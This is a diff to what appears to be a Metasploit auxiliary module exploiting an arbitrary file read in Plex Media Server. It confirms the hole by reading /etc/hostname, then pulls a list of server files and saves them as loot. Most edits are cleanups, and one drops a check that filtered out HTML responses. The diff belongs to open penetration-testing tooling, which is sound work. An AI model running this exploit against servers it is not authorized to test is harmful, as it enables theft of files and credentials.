@@ -5,15 +5,16 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
-  def initialize(_info = {})
+  def initialize(info = {})
     super(
-      {
+      update_info(
+        info,
         'Name' => 'Plex Media Server Metadata File Request Arbitrary File Read',
         'Description' => %q{
-          Plex Media Server (<= 1.43.2.10687, and the first 1.43.3 build 10828) exposes
+          Plex Media Server versions up to and including 1.43.3.10861 expose
           GET /library/metadata/<ratingKey>/file?url=<media-reference>. The handler
           resolves the caller-supplied media reference without validating its scheme or
           confining the resolved path to the item's metadata bundle directory. Supplying
@@ -28,16 +29,20 @@ class MetasploitModule < Msf::Auxiliary
           X-Plex-Token belonging to any user with library visibility works otherwise.
         },
         'Author' => [
-          'h00die', # module
-          # likely others once plex releases details, but none out yet
+          'h00die' # Metasploit module
         ],
         'License' => MSF_LICENSE,
         'References' => [
           ['URL', 'https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319'],
           # CVE not public yet
         ],
-        'DisclosureDate' => '2026-09-01'
-      }
+        'DisclosureDate' => '2026-09-01',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
     )
 
     register_options(
@@ -71,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res.get_xml_document.at_xpath('//MediaContainer/@version')&.text
   rescue StandardError => e
-    vprint_error("fingerprint failed: #{e.class} #{e.message}")
+    vprint_error("Fingerprint failed: #{e.class} #{e.message}")
     nil
   end
 
@@ -88,8 +93,8 @@ class MetasploitModule < Msf::Auxiliary
       })
       next unless res && res.code == 200
 
-      m = res.body.match(/ratingKey="(\d+)"/)
-      return m[1] if m
+      match = res.body.match(/ratingKey="(\d+)"/)
+      return match[1] if match
     end
     nil
   end
@@ -114,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Unknown('No metadata items visible (empty library or no access)') unless key
 
     res = read_file(key, '/etc/hostname')
-    if res && res.code == 200 && !res.body.start_with?('<html')
+    if res && res.code == 200
       vprint_good("Leaked /etc/hostname: #{res.body.strip}")
       return Exploit::CheckCode::Vulnerable("Confirmed file read via ratingKey #{key}")
     elsif res && res.code == 400
@@ -145,8 +150,7 @@ class MetasploitModule < Msf::Auxiliary
 
     files_to_read.each do |path|
       res = read_file(key, path)
-      if res && res.code == 200 && !res.body.start_with?('<html')
-
+      if res && res.code == 200
         loot = store_loot('plex.file', 'application/octet-stream', rhost, res.body, path, 'Plex Media Server file read')
         print_good("#{path} (#{res.body.length} bytes) saved to #{loot}")
         print_line(res.body) if res.body.length < 4096
